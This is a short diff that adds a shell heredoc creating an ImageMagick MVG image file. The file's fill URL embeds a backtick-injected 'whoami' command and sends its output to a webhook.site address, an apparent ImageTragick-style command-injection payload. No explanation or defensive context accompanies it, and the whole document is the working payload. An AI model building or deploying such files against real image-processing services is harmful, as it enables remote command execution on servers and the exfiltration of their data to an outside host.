@@ -1,0 +1,6 @@
+cat > /tmp/test.mvg << 'EOF'
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://webhook.site/3bd94b52-e0a9-4bd9-b559-16eed21d395e?x=`whoami`)'
+pop graphic-context
+EOF
